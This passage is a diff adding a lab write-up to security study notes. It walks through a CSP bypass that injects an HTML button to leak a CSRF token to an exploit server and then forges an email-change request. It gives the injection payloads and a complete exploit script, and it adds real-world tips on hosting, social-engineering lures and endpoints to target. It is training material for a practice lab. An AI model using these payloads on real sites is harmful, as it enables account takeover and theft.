@@ -11873,3 +11873,523 @@ XSS completely breaks CSRF
 ---
 
 **With XSS, you don’t bypass CSRF — you become the user**
+
+---
+
+# 🐞 Lab-29 — CSP Bypass → XSS → CSRF Chain Attack
+
+---
+
+## 🧠 🔥 OVERVIEW
+
+This lab demonstrates a **CSP bypass + XSS + CSRF chain attack**.
+
+---
+
+👉 The key idea:
+
+Even when JavaScript is blocked by CSP,
+we can still abuse HTML features (like forms & buttons)
+to leak CSRF tokens and perform sensitive actions.
+
+---
+
+## 🧠 🟦 Combined Attack Chain (Full Theory in One Flow)
+
+---
+
+1️⃣ XSS point exists (email parameter)
+2️⃣ CSP blocks normal JS execution
+3️⃣ Attacker injects HTML (button instead of script)
+4️⃣ Button sends form data to attacker (GET request)
+5️⃣ CSRF token leaks in URL
+6️⃣ Attacker captures token
+7️⃣ Attacker sends POST request using token
+8️⃣ Sensitive action executed (change email)
+
+---
+
+## 🧠 🟦 WHAT IS THIS TOPIC?
+
+### 🔹 Core Concepts
+
+---
+
+👉 Key terms:
+
+✔ XSS (Cross-Site Scripting) → Inject code into page
+✔ CSP (Content Security Policy) → Blocks scripts
+✔ CSRF Token → Secret token to protect actions
+✔ Form Hijacking → Redirect form submission
+
+---
+
+## 🧠 🟦 Key Insight
+
+---
+
+👉 Even if CSP blocks scripts,
+HTML-based attacks (forms, buttons) can still work.
+
+---
+
+## 🧪 🟩 LAB WALKTHROUGH (STEP-BY-STEP — NO SKIPS)
+
+---
+
+### 🪜 STEP 1 — Login
+
+Login using:
+
+
+wiener : peter
+
+
+---
+
+### 🪜 STEP 2 — Test Email Field
+
+Try normal XSS:
+
+```
+<img src=x onerror=alert(1)>
+
+```
+---
+
+👉 Result:
+
+❌ Blocked by client-side validation
+
+---
+
+### 🪜 STEP 3 — Bypass Client-Side Validation
+
+---
+
+👉 Action:
+
+✔ Open DevTools
+✔ Change input type:
+
+
+type="email" → type="text"
+
+
+---
+
+Inject payload:
+
+```
+foo@example.com"><img src=x onerror=alert(1)>
+```
+
+---
+
+👉 Result:
+
+✔ Payload reflected but NOT executed
+
+---
+
+👉 Conclusion:
+
+Server sanitization + CSP blocking scripts
+
+---
+
+## 📸 Screenshot 1 — Payload Injected in Email Field (Client-Side Bypass)
+
+
+
+![ss1-email-field-bypass](../images/csp-email-field-bypass.png)
+
+
+
+---
+
+### 🪜 STEP 4 — Test via URL
+
+Visit:
+
+```
+/my-account?email=<img src=x onerror=alert(1)>
+```
+
+---
+
+👉 Result:
+
+❌ Still blocked → CSP confirmed
+
+---
+
+## 📸 Screenshot 2 — URL Payload Blocked by CSP
+
+
+
+![ss2-url-csp-blocked](../images/url-csp-blocked.png)
+
+
+
+---
+
+### 🪜 STEP 5 — Check CSP
+
+Open DevTools console:
+
+
+Inline script blocked by CSP
+
+
+---
+
+👉 Conclusion:
+
+We cannot use JavaScript → must use HTML tricks
+
+---
+
+### 🪜 STEP 6 — Inject Button (FORM HIJACK)
+
+Payload:
+
+```
+/my-account?email=foo@bar"><button formaction="https://exploit-server/exploit">Click me</button>
+```
+
+---
+
+👉 Important parts:
+
+✔ email=foo@bar" → closes attribute
+✔ `<button>` → injects HTML
+✔ formaction → redirects form
+
+---
+
+👉 Result:
+
+✔ Button appears on page
+
+---
+
+### 🪜 STEP 7 — Click Button
+
+---
+
+👉 Result:
+
+✔ Redirects to exploit server
+
+---
+
+👉 Problem:
+
+❌ CSRF not visible (POST request → hidden in body)
+
+---
+
+## 📸 Screenshot 3 — Form Submitted via POST (CSRF Not Visible in URL)
+
+
+
+![ss3-post-csrf-hidden](../images/post-csrf-hidden.png)
+
+
+
+---
+
+### 🪜 STEP 8 — Force GET Request
+
+Modify payload:
+
+```
+<button formaction="https://exploit-server/exploit" formmethod="get">Click me</button>
+```
+
+---
+
+👉 Result:
+
+✔ CSRF appears in URL
+
+---
+
+👉 SUCCESS:
+
+✔ CSRF token leaked
+
+---
+
+## 📸 Screenshot 4 — GET Method Forces CSRF Token Visible in URL
+
+
+
+![ss4-get-csrf-visible](../images/get-csrf-visible.png)
+
+
+
+---
+
+### 🪜 STEP 9 — Final Exploit Script
+
+On exploit server:
+
+```
+<script>
+const academyFrontend = "https://victim-site/";
+const exploitServer = "https://attacker-site/exploit";
+
+const url = new URL(location);
+const csrf = url.searchParams.get('csrf');
+
+if (csrf) {
+    const form = document.createElement('form');
+    const email = document.createElement('input');
+    const token = document.createElement('input');
+
+    token.name = 'csrf';
+    token.value = csrf;
+
+    email.name = 'email';
+    email.value = 'hacker@evil-user.net';
+
+    form.method = 'post';
+    form.action = academyFrontend + "my-account/change-email";
+
+    form.append(email);
+    form.append(token);
+
+    document.documentElement.append(form);
+    form.submit();
+
+} else {
+    location = academyFrontend + "my-account?email=foo%22%3E<button formaction=" + exploitServer + " formmethod=get>Click me</button>";
+}
+</script>
+```
+
+---
+
+### 🪜 STEP 10 — Deliver Exploit
+
+Click:
+
+
+Store → Deliver exploit to victim
+
+
+---
+
+👉 Final Result:
+
+✔ Victim email changed → hacker@evil-user.net
+
+---
+
+## 📸 Screenshot 5 — Final Exploit Payload Delivered Successfully
+
+
+
+![ss5-final-exploit](../images/final-exploit-payload.png)
+
+
+
+---
+
+## 💣 🟨 PAYLOAD BREAKDOWN (EASY)
+
+---
+
+### 🔹 Payload 1 (Button Injection)
+
+---
+
+👉 Purpose:
+
+✔ Inject button → steal CSRF
+
+---
+
+### 🔹 Payload 2 (Script)
+
+---
+
+👉 Purpose:
+
+✔ IF no CSRF → steal it
+✔ IF CSRF exists → use it
+
+---
+
+### 🧠 Full Logic
+
+---
+
+1️⃣ Inject button
+2️⃣ Victim clicks
+3️⃣ CSRF leaks
+4️⃣ Script runs again
+5️⃣ Hidden form sent
+6️⃣ Email changed
+
+---
+
+## 🧠 🟥 REAL-WORLD SCENARIOS
+
+---
+
+### 🔥 Scenario 1 — No Exploit Server
+
+---
+
+👉 Solution:
+
+✔ Use:
+✔ ngrok
+✔ VPS server
+✔ Custom domain
+
+---
+
+### 🔥 Scenario 2 — No Login Access
+
+---
+
+👉 Solution:
+
+✔ Use stored XSS (comments, chat, etc.)
+
+---
+
+### 🔥 Scenario 3 — Email Field Not Vulnerable
+
+---
+
+👉 Solution:
+
+✔ Find ANY XSS:
+- comments
+- profile
+- search
+- file names
+
+---
+
+### 🔥 Scenario 4 — Strong CSP
+
+---
+
+👉 Solution:
+
+✔ Use HTML-based attacks:
+- button
+- form
+- iframe
+
+---
+
+### 🔥 Scenario 5 — POST Only Forms
+
+---
+
+👉 Solution:
+
+✔ Force GET using formmethod="get"
+
+---
+
+### 🔥 Scenario 6 — Victim Interaction Needed
+
+---
+
+👉 Solution:
+
+✔ Social engineering:
+"Click to verify account"
+
+---
+
+## 🧠 🟥 HIGH-VALUE ENDPOINTS
+
+---
+
+👉 Target these in real world:
+
+
+/my-account/change-email
+/change-password
+/add-payment-method
+/transfer-money
+/api/update-profile
+/admin/*
+
+
+---
+
+## 🔗 🟪 ATTACK CHAINS
+
+---
+
+### 🔗 Chain 1
+
+---
+
+XSS → CSRF steal → Account takeover
+
+---
+
+### 🔗 Chain 2
+
+---
+
+Stored XSS → Auto execution → No user interaction
+
+---
+
+### 🔗 Chain 3
+
+---
+
+XSS → Change email → Reset password → Full takeover
+
+---
+
+## 🧠 🟦 REMEDIATION
+
+---
+
+👉 Fix using:
+
+✔ Strict CSP (block inline + restrict forms)
+✔ form-action directive
+✔ HttpOnly cookies
+✔ SameSite cookies
+✔ CSRF tokens bound to session
+✔ Output encoding
+
+---
+
+## 🧠 🟪 MENTAL MODEL
+
+---
+
+You are NOT attacking inputs
+You are abusing browser behavior + trust
+
+---
+
+## 🎯 🧠 FINAL SUMMARY
+
+---
+
+This lab demonstrates how an attacker can bypass strict CSP protections by leveraging HTML-based injection instead of JavaScript. Even when inline scripts are blocked, injecting a button into a vulnerable input allows the attacker to hijack form submission. By forcing the form to use a GET request, the CSRF token becomes visible in the URL and is sent to the attacker's server. The attacker then uses a script hosted on their server to capture this token and perform a forged POST request, such as changing the victim's email. This illustrates a powerful real-world attack chain where XSS, CSP bypass, and CSRF are combined to achieve account takeover without directly executing malicious JavaScript in the target application.
+
+---
+
+## 🔥 FINAL ONE-LINER
+
+---
+
+**When JavaScript is blocked, hijack the form — the browser executes the attack for you**
